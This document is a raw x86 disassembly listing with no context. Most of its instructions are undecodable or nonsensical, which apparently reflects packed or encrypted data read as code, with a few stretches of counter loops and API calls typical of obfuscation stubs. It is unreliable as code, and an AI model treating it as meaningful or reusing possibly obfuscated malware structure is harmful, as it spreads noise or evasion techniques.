  40e58d:	mov    eax,ds:0x5ecda84b
  40e592:	xchg   DWORD PTR [edi],edx
  40e594:	dec    ecx
  40e595:	lds    edx,FWORD PTR [edi-0x5f]
  40e598:	dec    ecx
  40e599:	inc    ebx
  40e59a:	dec    edi
  40e59b:	adc    ebp,DWORD PTR [esi+0x49c88348]
  40e5a1:	inc    ecx
  40e5a2:	jnp    0x40e5d4
  40e5a4:	dec    ebx
  40e5a5:	jl     0x40e557
  40e5a7:	pop    eax
  40e5a8:	or     BYTE PTR [esi-0xd211284],dl
  40e5ae:	xchg   edx,eax
  40e5af:	jmp    0x40e5a7
  40e5b1:	in     eax,0xef
  40e5b3:	stos   BYTE PTR es:[edi],al
  40e5b4:	shr    ecx,0xec
  40e5b7:	imul   ebx,DWORD PTR [ebp+edi*4-0x648514ed],0x74
  40e5bf:	fwait
  40e5c0:	dec    ebp
  40e5c1:	ror    dh,1
  40e5c3:	xlat   BYTE PTR ds:[ebx]
  40e5c4:	jp     0x40e5f6
  40e5c6:	retf   0xe2ac
  40e5c9:	inc    ebp
  40e5ca:	dec    eax
  40e5cb:	jo     0x573f7bcb
  40e5d1:	rep stos BYTE PTR es:[edi],al
  40e5d3:	xchg   dh,bh
  40e5d5:	inc    ebp
  40e5d6:	push   ss
  40e5d7:	(bad)  
  40e5d8:	cmp    eax,0x25386059
  40e5dd:	xchg   esp,eax
  40e5de:	lds    edx,FWORD PTR [edx+0x73d589c7]
  40e5e4:	jp     0x40e5f7
  40e5e6:	aad    0x96
  40e5e8:	xchg   DWORD PTR [esi+0x44],esi
  40e5eb:	sar    ah,0x1e
  40e5ee:	push   edx
  40e5ef:	xor    dh,bh
  40e5f1:	test   al,0x68
  40e5f3:	iret   
  40e5f4:	cmp    eax,0x2b7d8454
  40e5f9:	mov    esp,0xd6451e6e
  40e5fe:	mov    ah,BYTE PTR [edi+0x6e]
  40e601:	ja     0x40e5a2
  40e603:	add    ah,BYTE PTR [ecx+0x20]
  40e606:	mul    DWORD PTR [esi-0x12]
  40e609:	mov    dl,0x56
  40e60b:	in     al,dx
  40e60c:	retf   
  40e60d:	imul   esp,DWORD PTR [edi-0x94e1f6a],0x43
  40e614:	mov    DWORD PTR [ecx],ecx
  40e616:	into   
  40e617:	sub    ah,BYTE PTR [edi]
  40e619:	imul   esi,DWORD PTR [esi+0x75],0x4f
  40e61d:	in     al,dx
  40e61e:	sub    al,0x10
  40e620:	popa   
  40e621:	popa   
  40e622:	cmp    al,0x91
  40e624:	sub    DWORD PTR [edx],0xffffff92
  40e627:	iret   
  40e628:	test   al,0x9f
  40e62a:	add    cl,BYTE PTR [ecx+0x50]
  40e62d:	pop    esi
  40e62e:	cmp    esi,DWORD PTR [ecx+0x8271c2f]
  40e634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e635:	rcr    DWORD PTR ds:0xb12982af,cl
  40e63b:	or     ebp,esp
  40e63d:	push   0x32b3d067
  40e642:	aad    0x7
  40e644:	in     al,0xde
  40e646:	xchg   DWORD PTR [eax-0x46fa711c],esi
  40e64c:	push   esp
  40e64d:	jne    0x40e649
  40e64f:	sub    DWORD PTR [esi],eax
  40e651:	jmp    0x4a39:0x85f31ca2
  40e658:	xchg   edi,eax
  40e659:	icebp  
  40e65a:	loopne 0x40e61e
  40e65c:	cmp    BYTE PTR [ebx+0x70],bl
  40e65f:	nop
  40e660:	inc    esi
  40e661:	sub    dh,0x6a
  40e664:	lods   al,BYTE PTR ds:[esi]
  40e665:	aas    
  40e666:	inc    esi
  40e667:	data16 add BYTE PTR [edi+0x37fb91d8],al
  40e66e:	pop    esp
  40e66f:	xor    al,cl
  40e671:	in     al,dx
  40e672:	iret   
  40e673:	mov    eax,ds:0x7f4e3282
  40e678:	adc    al,0xf9
  40e67a:	cmc    
  40e67b:	sub    BYTE PTR [edi-0x3a],ah
  40e67e:	scas   eax,DWORD PTR es:[edi]
  40e67f:	jecxz  0x40e615
  40e681:	jno    0x40e6f9
  40e683:	arpl   WORD PTR [ebx+0x67],cx
  40e686:	mov    ds:0x8ec5d121,eax
  40e68b:	mov    ecx,0x8be1c206
  40e690:	ret    
  40e691:	std    
  40e692:	and    al,0x5c
  40e694:	jo     0x40e62c
  40e696:	and    BYTE PTR [eax],0x17
  40e699:	ret    
  40e69a:	add    eax,0x68c47e3b
  40e69f:	sbb    eax,0xfe61fc3f
  40e6a4:	ret    0x5e27
  40e6a7:	scas   eax,DWORD PTR es:[edi]
  40e6a8:	mov    ecx,DWORD PTR [ebp+edi*1-0x28]
  40e6ac:	(bad)  
  40e6ad:	push   edx
  40e6ae:	xor    eax,0x529e77b9
  40e6b3:	dec    ebp
  40e6b4:	inc    edx
  40e6b5:	test   edi,esp
  40e6b7:	pop    es
  40e6b8:	or     al,0x2c
  40e6ba:	inc    edx
  40e6bb:	mov    dh,0x89
  40e6bd:	dec    esp
  40e6be:	add    edx,DWORD PTR [esi-0x41]
  40e6c1:	xchg   esp,eax
  40e6c2:	mov    dl,0x54
  40e6c4:	add    cl,BYTE PTR [eax+0x78]
  40e6c7:	mov    bh,0x5e
  40e6c9:	hlt    
  40e6ca:	mov    DWORD PTR [eax+esi*1+0x45],edx
  40e6ce:	inc    ebp
  40e6cf:	mov    dh,0x64
  40e6d1:	cmc    
  40e6d2:	push   ebp
  40e6d3:	jmp    0x40e733
  40e6d5:	inc    ebx
  40e6d6:	fmul   st,st(7)
  40e6d8:	xchg   ebx,eax
  40e6d9:	fst    st(4)
  40e6db:	cld    
  40e6dc:	out    0x6d,eax
  40e6de:	pop    edi
  40e6df:	jmp    0x40e6cd
  40e6e1:	cmc    
  40e6e2:	mov    ebx,0x149811b7
  40e6e7:	pop    ss
  40e6e8:	in     eax,dx
  40e6e9:	je     0x40e66b
  40e6eb:	mov    ch,0xca
  40e6ed:	mov    ebp,0xf6c23079
  40e6f2:	imul   ebx,DWORD PTR [ebp-0x488a1c43],0xd9c41dc0
  40e6fc:	dec    edi
  40e6fd:	fdiv   DWORD PTR [ebx]
  40e6ff:	mov    BYTE PTR [ebx],0xc3
  40e702:	mov    DWORD PTR [ebp+0x8],eax
  40e705:	mov    eax,ds:0x41eae6
  40e70a:	mov    DWORD PTR [ebp+0x8],eax
  40e70d:	mov    eax,DWORD PTR [ebp-0x14]
  40e710:	mov    DWORD PTR [ebp-0x4],eax
  40e713:	mov    eax,DWORD PTR [ebp-0x4]
  40e716:	push   0x4
  40e718:	pop    ecx
  40e719:	sub    ecx,eax
  40e71b:	add    ecx,DWORD PTR [ebp-0x18]
  40e71e:	mov    DWORD PTR [ebp-0x8],ecx
  40e721:	jmp    0x40e979
  40e726:	(bad)
  40e729:	(bad)  
  40e72a:	leave  
  40e72b:	fcmovbe st,st(5)
  40e72d:	sar    esp,1
  40e72f:	rcr    DWORD PTR [esp+edi*1],1
  40e732:	iret   
  40e733:	xchg   ebp,eax
  40e734:	gs jo  0x40e776
  40e737:	mov    ebx,0x7e357878
  40e73c:	js     0x40e7b6
  40e73e:	shl    edi,1
  40e740:	inc    ebx
  40e741:	mov    ah,0x31
  40e743:	xchg   ecx,eax
  40e744:	mov    BYTE PTR [ebx],dl
  40e746:	xchg   ecx,eax
  40e747:	addr16 jns 0x40e6d8
  40e74a:	add    al,0xb7
  40e74c:	jge    0x40e6fb
  40e74e:	test   eax,0xf05b374d
  40e753:	cmp    ah,BYTE PTR [ebp+0x1a]
  40e756:	aas    
  40e757:	out    0xf0,eax
  40e759:	mov    ebp,0x1970e2d0
  40e75e:	and    DWORD PTR [eax+0x2b],0x7597d86
  40e765:	sub    DWORD PTR [edi+0x7c],ebp
  40e768:	stc    
  40e769:	popa   
  40e76a:	cmp    eax,0x9e3656c2
  40e76f:	and    BYTE PTR [ebx+0x70],ah
  40e772:	leave  
  40e773:	add    BYTE PTR [eax+0x2f],0x75
  40e777:	push   esi
  40e778:	or     esi,DWORD PTR [ebp-0x3770563b]
  40e77e:	and    DWORD PTR [edi],ebp
  40e780:	or     ebp,DWORD PTR [eax+0x34]
  40e783:	cvtps2pi mm0,QWORD PTR [esi-0x5]
  40e787:	mov    edi,0xa3e205ed
  40e78c:	repz mov esp,0xca5b2511
  40e792:	sbb    DWORD PTR [esi-0x52],0xc147b985
  40e799:	mov    bh,0x27
  40e79b:	out    0x84,eax
  40e79d:	(bad)
  40e7a2:	arpl   WORD PTR [edx-0x17fba7c7],ax
  40e7a8:	rcl    BYTE PTR [esi+edi*4+0x67c3398e],cl
  40e7af:	jnp    0x40e737
  40e7b1:	mov    ?,esp
  40e7b3:	in     eax,dx
  40e7b4:	and    BYTE PTR [ecx+eax*1],dl
  40e7b7:	xlat   BYTE PTR ds:[ebx]
  40e7b8:	fsubr  QWORD PTR [esi-0x19a1b6c9]
  40e7be:	xchg   DWORD PTR [esi],ebp
  40e7c0:	pop    ecx
  40e7c1:	pop    ecx
  40e7c2:	pop    ecx
  40e7c3:	icebp  
  40e7c4:	int    0x61
  40e7c6:	imul   eax,edx,0x77
  40e7c9:	clc    
  40e7ca:	mov    dl,BYTE PTR [ecx]
  40e7cc:	jmp    0x40e762
  40e7ce:	int3   
  40e7cf:	cwde   
  40e7d0:	xchg   ecx,eax
  40e7d1:	retf   0x58c3
  40e7d4:	pop    ds
  40e7d5:	stc    
  40e7d6:	in     al,dx
  40e7d7:	popa   
  40e7d8:	cdq    
  40e7d9:	out    0x8b,al
  40e7db:	ins    BYTE PTR es:[edi],dx
  40e7dc:	push   ds
  40e7dd:	adc    cl,BYTE PTR [edi+0x33]
  40e7e0:	fild   DWORD PTR [ecx-0x31]
  40e7e3:	push   es
  40e7e4:	add    edi,ebx
  40e7e6:	push   0xf0d77ec9
  40e7eb:	jmp    0x8868322a
  40e7f0:	(bad)  
  40e7f1:	imul   ebx,DWORD PTR [eax-0x4f],0xdcba5672
  40e7f8:	inc    esp
  40e7f9:	xor    ecx,edi
  40e7fb:	and    BYTE PTR [ebp+0x12],0x6f
  40e7ff:	mov    esi,fs
  40e801:	adc    BYTE PTR [edx-0x4ed6ce4b],dl
  40e807:	and    BYTE PTR [ecx-0x467f81],dh
  40e80d:	push   edi
  40e80e:	sbb    esi,DWORD PTR [edi]
  40e810:	test   cl,dl
  40e812:	push   ebp
  40e813:	pusha  
  40e814:	inc    esi
  40e815:	adc    al,0x58
  40e817:	fsubr  DWORD PTR [esi-0x70]
  40e81a:	retf   
  40e81b:	push   0xffffff9b
  40e81d:	rcl    BYTE PTR [ebx],0xe7
  40e820:	cmp    eax,0xbeb27344
  40e825:	sbb    BYTE PTR ss:[ebp-0x33157353],0x6a
  40e82d:	sbb    al,0xdd
  40e82f:	sub    eax,0x32d233fe
  40e834:	mov    esp,0xa505f4d8
  40e839:	cld    
  40e83a:	(bad)  
  40e83c:	mov    ecx,0x303692ee
  40e841:	and    DWORD PTR [ebx+0x34],0x44
  40e845:	sbb    dl,ah
  40e847:	out    0xb6,al
  40e849:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e84a:	popf   
  40e84b:	mov    WORD PTR [ecx+ecx*8],?
  40e84e:	cmp    al,0x77
  40e850:	xchg   ecx,eax
  40e851:	xor    ah,BYTE PTR [eax]
  40e853:	loopne 0x40e8b7
  40e855:	retf   0xd7e6
  40e858:	and    al,0xbf
  40e85a:	popf   
  40e85b:	popf   
  40e85c:	arpl   WORD PTR fs:[edi+edi*4+0x7295aaf0],bp
  40e864:	(bad)  
  40e865:	mov    bl,0x86
  40e867:	lds    eax,FWORD PTR [ebx+0x52]
  40e86a:	je     0x40e812
  40e86c:	outs   dx,DWORD PTR ds:[esi]
  40e86d:	(bad)  
  40e86e:	fbstp  TBYTE PTR [ebp+0x6b]
  40e871:	jne    0x40e879
  40e873:	or     bl,BYTE PTR [edx+0x148ebace]
  40e879:	push   0x3a9beee7
  40e87e:	pop    es
  40e87f:	or     ebp,ecx
  40e881:	(bad)  
  40e883:	and    DWORD PTR [eax+edx*8],edx
  40e886:	dec    BYTE PTR [esp+eiz*8]
  40e889:	(bad)  
  40e88a:	rol    BYTE PTR [eax],1
  40e88c:	lahf   
  40e88d:	in     eax,0x2a
  40e88f:	(bad)  
  40e890:	push   edi
  40e891:	xchg   edi,eax
  40e892:	fdivr  QWORD PTR [edx]
  40e894:	outs   dx,BYTE PTR ds:[esi]
  40e895:	jecxz  0x40e87c
  40e897:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e898:	scas   al,BYTE PTR es:[edi]
  40e899:	in     al,dx
  40e89a:	arpl   WORD PTR ds:0x3a348c,dx
  40e8a0:	pop    eax
  40e8a1:	fs jne 0x40e907
  40e8a4:	and    cl,BYTE PTR [ecx]
  40e8a6:	sbb    edi,esp
  40e8a8:	sub    DWORD PTR [ecx],edi
  40e8aa:	pop    ebp
  40e8ab:	ss pop ecx
  40e8ad:	jmp    0x40e905
  40e8af:	jmp    0xcde2d20c
  40e8b4:	lea    edi,[esi-0x7dfb2019]
  40e8ba:	enter  0x5d11,0x2b
  40e8be:	daa    
  40e8bf:	sub    al,0x24
  40e8c1:	pop    ebx
  40e8c2:	xchg   ebp,eax
  40e8c3:	loop   0x40e906
  40e8c5:	arpl   WORD PTR [eax-0xaa9fc97],cx
  40e8cb:	inc    ebp
  40e8cc:	retf   
  40e8cd:	sub    DWORD PTR [ebp+0xa],esi
  40e8d0:	and    al,0x9e
  40e8d2:	pop    esp
  40e8d3:	int3   
  40e8d4:	xor    DWORD PTR [ecx+0x20],eax
  40e8d7:	mov    ?,WORD PTR [edx-0x49]
  40e8da:	xchg   esi,eax
  40e8db:	test   al,0x9e
  40e8dd:	pop    esp
  40e8de:	repnz test eax,0x64e0b474
  40e8e4:	cmp    edx,0xffffffc5
  40e8e7:	cli    
  40e8e8:	sbb    DWORD PTR [edx-0x1b53251d],ecx
  40e8ee:	dec    edi
  40e8ef:	in     al,0xe8
  40e8f1:	pushf  
  40e8f2:	cmp    BYTE PTR [ecx-0x46],0x3d
  40e8f6:	xor    al,0x1b
  40e8f8:	dec    esi
  40e8f9:	popa   
  40e8fa:	sub    bh,BYTE PTR [eax+0x70]
  40e8fd:	jge    0x40e949
  40e8ff:	jle    0x40e968
  40e901:	call   0xd3e0:0x9e45fa04
  40e908:	in     eax,0xa9
  40e90a:	jg     0x40e95d
  40e90c:	jns    0x40e8e5
  40e90e:	mov    WORD PTR [eax+0x51f64557],?
  40e914:	push   ebx
  40e915:	mov    DWORD PTR [eax-0x13452030],edx
  40e91b:	mov    bh,0xe9
  40e91d:	test   DWORD PTR [edx-0x67],esp
  40e920:	out    dx,al
  40e921:	pop    ebx
  40e922:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e923:	push   ebx
  40e924:	dec    esp
  40e925:	sbb    BYTE PTR [eax+0x22],0xf2
  40e929:	adc    eax,0xd4a12c22
  40e92f:	dec    ecx
  40e930:	into   
  40e931:	adc    bh,bl
  40e933:	push   ebp
  40e934:	cmp    BYTE PTR [ebx-0xd],bh
  40e937:	das    
  40e938:	jns    0x40e939
  40e93a:	mov    edx,0x38e8bf3b
  40e93f:	(bad)  
  40e940:	in     eax,dx
  40e941:	fiadd  WORD PTR [ecx-0x6a]
  40e944:	mov    esp,0x4f9dbe28
  40e949:	cdq    
  40e94a:	lods   al,BYTE PTR ds:[esi]
  40e94b:	pop    ds
  40e94c:	jno    0x40e9bf
  40e94e:	(bad)  
  40e94f:	pop    ebp
  40e950:	and    eax,0x83cd7ee3
  40e955:	fwait
  40e956:	ds jo  0x40e9c0
  40e959:	push   es
  40e95a:	retf   0x9580
  40e95d:	dec    ebp
  40e95e:	inc    eax
  40e95f:	mov    ebp,0x918dcfb
  40e964:	adc    eax,0xdd40e2bd
  40e969:	fsubr  DWORD PTR [esi-0x4afe31c5]
  40e96f:	cmc    
  40e970:	out    dx,eax
  40e971:	shr    BYTE PTR ds:0x4793b88f,1
  40e977:	aas    
  40e978:	cmp    cl,BYTE PTR [ebx-0x39ccf3bb]
  40e97e:	lea    edi,[edi+eax*1+0x327298]
  40e985:	cmp    edi,0x50a
  40e98b:	jne    0x40d51f
  40e991:	mov    eax,DWORD PTR [ebp+0xc]
  40e994:	pop    edi
  40e995:	xor    eax,esi
  40e997:	pop    esi
  40e998:	add    eax,ebx
  40e99a:	pop    ebx
  40e99b:	leave  
  40e99c:	ret    0x8
  40e99f:	push   ebp
  40e9a0:	mov    ebp,esp
  40e9a2:	sub    esp,0x44
  40e9a5:	push   edi
  40e9a6:	mov    eax,DWORD PTR [ebp+0xc]
  40e9a9:	mov    DWORD PTR [ebp-0x10],eax
  40e9ac:	mov    eax,DWORD PTR [ebp+0x8]
  40e9af:	and    DWORD PTR ds:0x42af71,0x0
  40e9b9:	mov    edx,DWORD PTR ds:0x42af71
  40e9bf:	inc    edx
  40e9c0:	mov    DWORD PTR ds:0x42af71,edx
  40e9c6:	cmp    DWORD PTR ds:0x42af71,0x6
  40e9cd:	jne    0x40e9dc
  40e9d3:	push   DWORD PTR [ebp-0x28]
  40e9d6:	call   DWORD PTR ds:0x41d250
  40e9dc:	cmp    DWORD PTR ds:0x42af71,0x5
  40e9e3:	jne    0x40e9f6
  40e9e9:	mov    edx,DWORD PTR ds:0x42af71
  40e9ef:	inc    edx
  40e9f0:	mov    DWORD PTR ds:0x42af71,edx
  40e9f6:	cmp    DWORD PTR ds:0x42af71,0x10
  40e9fd:	jb     0x40e9b9
  40ea03:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  40ea0a:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40ea11:	jmp    0x40ec99
  40ea16:	cmp    eax,0xd6ce3ed7
  40ea1b:	aad    0xcd
  40ea1d:	xlat   BYTE PTR ds:[ebx]
  40ea1e:	jecxz  0x40e9ce
  40ea20:	ja     0x40e9b6
  40ea22:	neg    cl
  40ea24:	fild   QWORD PTR [edx+0x7878b9f4]
  40ea2a:	in     eax,0x7e
  40ea2c:	js     0x40eaa6
  40ea2e:	xchg   edi,eax
  40ea2f:	imul   ebx
  40ea31:	mov    BYTE PTR [ecx+ebx*1-0x2173d0f5],0x80
  40ea39:	jmp    0x6795b4c2
  40ea3e:	nop
  40ea3f:	inc    edx
  40ea40:	test   dh,dh
  40ea42:	es cmc 
  40ea44:	lods   eax,DWORD PTR ds:[esi]
  40ea45:	xchg   ebp,eax
  40ea46:	mov    ah,0x13
  40ea48:	mov    edi,cs
  40ea4a:	sub    eax,0xb8c3ca8b
  40ea4f:	es push cs
  40ea51:	or     WORD PTR [esi],si
  40ea54:	mov    eax,0x9437962d
  40ea59:	icebp  
  40ea5a:	sub    cl,dh
  40ea5c:	jnp    0x40ea5c
  40ea5e:	add    eax,DWORD PTR [ebp+edi*2+0x2842484d]
  40ea65:	adc    bh,al
  40ea67:	cmp    ebp,DWORD PTR [ecx+ecx*1]
  40ea6a:	lds    ebx,FWORD PTR [edi]
  40ea6c:	ss jle 0x40ea7f
  40ea6f:	cwde   
  40ea70:	adc    edi,DWORD PTR [edi+ebp*2+0x6b]
  40ea74:	dec    esi
  40ea75:	pop    ebx
  40ea76:	not    BYTE PTR [esi+0x6f]
  40ea79:	call   0x66be5a01
  40ea7e:	add    BYTE PTR [ecx+eiz*1],cl
  40ea81:	stos   BYTE PTR es:[edi],al
  40ea82:	clc    
  40ea83:	(bad)  
  40ea84:	int    0xb7
  40ea86:	(bad)  [edi-0x2f]
  40ea89:	inc    edx
  40ea8a:	rcr    DWORD PTR [ebp+0x417ce678],cl
  40ea90:	mov    eax,0x42655a29
  40ea95:	or     al,0x70
  40ea97:	data16 stc 
  40ea99:	adc    al,0xc0
  40ea9b:	mov    al,ss:0x39fcc776
  40eaa1:	mov    dl,0x40
  40eaa3:	adc    al,0x98
  40eaa5:	test   BYTE PTR [edx],ah
  40eaa7:	add    edi,DWORD PTR [eax]
  40eaa9:	inc    eax
  40eaaa:	mov    ch,0x5d
  40eaac:	mov    bl,BYTE PTR [ebx-0x3b2d710d]
  40eab2:	pop    eax
  40eab3:	jne    0x40ea8a
  40eab5:	(bad)  
  40eab6:	js     0x40eb1d
  40eab8:	dec    edx
  40eab9:	neg    DWORD PTR [esi+0x7c]
  40eabc:	add    eax,0x3d403e8
  40eac1:	and    cl,bh
  40eac3:	push   ecx
  40eac4:	xor    edx,DWORD PTR [eax+0x7891478b]
  40eaca:	mov    WORD PTR [edi],ds
  40eacc:	mov    BYTE PTR [esi+ecx*8-0x257cd8c7],0xcf
  40ead4:	retf   0xb38a
  40ead7:	mov    ebx,0xa72c1ce6
  40eadc:	mov    edx,0x53f270e
  40eae1:	cdq    
  40eae2:	jae    0x40ea91
  40eae4:	or     al,0x89
  40eae6:	pusha  
  40eae7:	dec    eax
  40eae8:	stos   BYTE PTR es:[edi],al
  40eae9:	shr    ah,cl
  40eaeb:	loopne 0x40eb01
  40eaed:	sti    
  40eaee:	imul   edi,DWORD PTR [eax+0x31],0x5d
  40eaf2:	jns    0x40eb34
  40eaf4:	imul   dl
  40eaf6:	mov    bl,0xec
  40eaf8:	stos   BYTE PTR es:[edi],al
  40eaf9:	inc    edi
  40eafa:	pop    ecx
  40eafb:	cmp    al,0x2d
  40eafd:	mov    dh,BYTE PTR [edi+0x4a66de18]
  40eb03:	mov    ds:0xba80cd84,al
  40eb08:	scas   eax,DWORD PTR es:[edi]
  40eb09:	or     al,BYTE PTR fs:[esi+0x9]
  40eb0d:	sahf   
  40eb0e:	fidivr WORD PTR [esi-0x47]
  40eb11:	or     BYTE PTR [edx-0x798599a6],bh
  40eb17:	mov    bh,0xe
  40eb19:	mov    ebx,0x4c60b9c0
  40eb1e:	popf   
  40eb1f:	mov    dl,BYTE PTR cs:[edi+0x930009c]
  40eb26:	(bad)  
  40eb27:	mov    esi,0x67fa9181
  40eb2c:	and    eax,0xce28c152
  40eb31:	xchg   ebx,eax
  40eb32:	je     0x40eac6
  40eb34:	jg     0x40eb8f
  40eb36:	xor    DWORD PTR cs:[ebx+0x52b626cb],0x3447d1a8
  40eb41:	setle  BYTE PTR [edi]
  40eb44:	test   eax,0xdf228547
  40eb49:	xor    BYTE PTR [ebp-0x68],ch
  40eb4c:	dec    edx
  40eb4d:	sbb    DWORD PTR [eax],ecx
  40eb4f:	mov    BYTE PTR [ebp+0x4e],ch
  40eb52:	ins    DWORD PTR es:[edi],dx
  40eb53:	fsubr  DWORD PTR [edi]
  40eb55:	sub    esp,esi
  40eb57:	pop    edx
  40eb58:	int    0x50
  40eb5a:	ret    0x3dcf
  40eb5d:	push   ds
  40eb5e:	xchg   esi,eax
  40eb5f:	cmp    eax,0xd5eb583
  40eb64:	and    eax,0xdc1d4b28
  40eb69:	(bad)  
  40eb6a:	adc    ebp,ecx
  40eb6c:	adc    esp,ebx
  40eb6e:	cmp    al,BYTE PTR [edi]
  40eb70:	ins    BYTE PTR es:[edi],dx
  40eb71:	lea    ecx,[ebp+esi*2+0x28]
  40eb75:	dec    ecx
  40eb76:	mov    al,es:0xe69bee18
  40eb7c:	mov    edx,0x47db5e67
  40eb81:	mov    ds:0x90749f17,al
  40eb86:	and    DWORD PTR [ebp-0x75231a26],edx
  40eb8c:	xchg   esp,eax
  40eb8d:	push   0x8c9f1938
  40eb92:	pop    es
  40eb93:	cdq    
  40eb94:	mov    ah,0xc0
  40eb96:	je     0x40ebe7
  40eb98:	scas   al,BYTE PTR es:[edi]
  40eb99:	mov    eax,0x3c7d81bb
  40eb9e:	int3   
  40eb9f:	xchg   ebp,eax
  40eba0:	adc    DWORD PTR [ebx+0x1a],esp
  40eba3:	inc    edi
  40eba4:	pop    ebx
  40eba5:	mov    bl,BYTE PTR [ebp+0x39]
  40eba8:	push   ebx
  40eba9:	pop    edx
  40ebaa:	push   edi
  40ebab:	into   
  40ebac:	push   0x75d744fe
  40ebb1:	jb     0x40eb6a
  40ebb3:	retf   
  40ebb4:	pop    esi
  40ebb5:	cmp    esi,DWORD PTR ds:0xf1458f4c
  40ebbb:	das    
  40ebbc:	loop   0x40eb87
  40ebbe:	mov    ebp,DWORD PTR [ebp+0x69]
  40ebc1:	or     BYTE PTR [ebp-0x32],0x58
  40ebc5:	push   cs
  40ebc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebc7:	sub    eax,0x89e0767d
  40ebcc:	and    al,0x78
  40ebce:	cld    
  40ebcf:	pop    es
  40ebd0:	sbb    DWORD PTR [ecx],esi
  40ebd2:	jp     0x40eb92
  40ebd4:	scas   al,BYTE PTR es:[edi]
  40ebd5:	fwait
  40ebd6:	jbe    0x40ebc5
  40ebd8:	ror    bl,1
  40ebda:	hlt    
  40ebdb:	push   cs
  40ebdc:	pop    eax
  40ebdd:	xor    DWORD PTR [ecx-0x55],esi
  40ebe0:	fbstp  TBYTE PTR [esi-0x5]
  40ebe3:	and    edx,DWORD PTR [eax+eax*4]
  40ebe6:	adc    esi,DWORD PTR [ebx]
  40ebe8:	fnsave [edx+0x21]
  40ebeb:	retf   0x42bf
  40ebee:	jp     0x40ebe1
  40ebf0:	out    dx,al
  40ebf1:	sbb    eax,0xc134aeef
  40ebf6:	call   0xf12e31c2
  40ebfb:	outs   dx,BYTE PTR ds:[esi]
  40ebfc:	(bad)  
  40ebfd:	push   ebx
  40ebfe:	xchg   esi,eax
  40ebff:	pop    ebp
  40ec00:	hlt    
  40ec01:	pop    ecx
  40ec02:	xor    eax,DWORD PTR [edx-0x3572ff07]
  40ec08:	aam    0xdb
  40ec0a:	daa    
  40ec0b:	adc    al,0x8f
  40ec0d:	push   esi
  40ec0e:	xchg   al,ch
  40ec10:	xor    ch,BYTE PTR [eax+0x6f]
  40ec13:	arpl   WORD PTR [edi+0x394aa48e],cx
  40ec19:	ss in  eax,dx
  40ec1b:	in     al,0x30
  40ec1d:	cli    
  40ec1e:	ficomp DWORD PTR [esi+0x7a]
  40ec21:	sub    dh,BYTE PTR [ebx+0x3d]
  40ec24:	data16 and al,0x92
  40ec27:	and    esi,DWORD PTR [ecx-0x84ca10]
  40ec2d:	ds das 
  40ec2f:	jae    0x40ec5f
  40ec31:	pop    edx
  40ec32:	out    dx,eax
  40ec33:	dec    ebx
  40ec34:	fild   DWORD PTR [ecx+0x55c7c21f]
  40ec3a:	sub    dl,BYTE PTR [eax]
  40ec3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec3d:	fisttp QWORD PTR [ecx+0x60]
  40ec40:	jge    0x40ec5a
  40ec42:	arpl   WORD PTR [edx+0x62],si
  40ec45:	lods   al,BYTE PTR ds:[esi]
  40ec46:	pop    ebx
  40ec48:	js     0x40ec43
  40ec4a:	ins    DWORD PTR es:[edi],dx
  40ec4b:	push   esp
  40ec4c:	ficomp DWORD PTR [ebx-0x4c6ca4a7]
  40ec52:	add    edx,edi
  40ec54:	lods   eax,DWORD PTR ds:[esi]
  40ec55:	pop    eax
  40ec56:	mov    ds:0xb9f09f45,al
  40ec5b:	scas   al,BYTE PTR es:[edi]
  40ec5c:	outs   dx,DWORD PTR ds:[esi]
  40ec5d:	(bad)  
  40ec5e:	aaa    
  40ec5f:	jne    0x40ecac
  40ec61:	loop   0x40eca9
  40ec63:	imul   esp,DWORD PTR [ecx*4-0x62072f07],0xb626ef75
  40ec6e:	push   edi
  40ec6f:	rcl    BYTE PTR [ebx],0xba
  40ec72:	push   ss
  40ec73:	sub    BYTE PTR [esi-0x23],ah
  40ec76:	push   cs
  40ec77:	dec    ebx
  40ec78:	jl     0x40ebfb
  40ec7a:	and    ebp,DWORD PTR [edi+0x1995f0a4]
  40ec80:	mov    esi,0x2a71f1e0
  40ec85:	dec    ebx
  40ec86:	call   0xd868f711
  40ec8b:	xor    eax,0xbfccf2a1
  40ec90:	aad    0x5a
  40ec92:	mov    edi,0xd247c17e
  40ec97:	int    0x31
  40ec99:	mov    edx,DWORD PTR [ebp+0x8]
  40ec9c:	or     ecx,DWORD PTR ds:0x42aefd
  40eca2:	mov    DWORD PTR [ebp-0x40],eax
  40eca5:	mov    eax,0x7510850
  40ecaa:	xor    edx,eax
  40ecac:	add    edi,0x2fd0
  40ecb2:	mov    ecx,0x327298
  40ecb7:	mov    DWORD PTR ds:0x42aff9,0x17
  40ecc1:	cmp    DWORD PTR ds:0x42aff9,0x0
  40ecc8:	je     0x40ed80
  40ecce:	cmp    DWORD PTR ds:0x42aff9,0x5
  40ecd5:	jne    0x40ecf1
  40ecdb:	push   DWORD PTR [ebp-0x1c]
  40ecde:	push   0x65c1
  40ece3:	push   DWORD PTR [ebp-0x20]
  40ece6:	push   0x6120
  40eceb:	call   DWORD PTR ds:0x41d254
  40ecf1:	cmp    DWORD PTR ds:0x42aff9,0x6
  40ecf8:	jne    0x40ed0b
  40ecfe:	mov    edi,DWORD PTR ds:0x42aff9
  40ed04:	dec    edi
  40ed05:	mov    DWORD PTR ds:0x42aff9,edi
  40ed0b:	mov    edi,DWORD PTR ds:0x42aff9
  40ed11:	dec    edi
  40ed12:	mov    DWORD PTR ds:0x42aff9,edi
  40ed18:	jmp    0x40ecc1
  40ed1d:	and    DWORD PTR ds:0x42b005,0x0
  40ed27:	mov    edi,DWORD PTR ds:0x42b005
  40ed2d:	inc    edi
  40ed2e:	mov    DWORD PTR ds:0x42b005,edi
  40ed34:	cmp    DWORD PTR ds:0x42b005,0x5
  40ed3b:	jne    0x40ed53
  40ed41:	push   DWORD PTR [ebp-0xc]
  40ed44:	push   DWORD PTR [ebp-0xc]
  40ed47:	push   DWORD PTR [ebp-0x18]
  40ed4a:	push   DWORD PTR [ebp-0x14]
  40ed4d:	call   DWORD PTR ds:0x41d1a4
  40ed53:	cmp    DWORD PTR ds:0x42b005,0x4
  40ed5a:	jne    0x40ed6d
  40ed60:	mov    edi,DWORD PTR ds:0x42b005
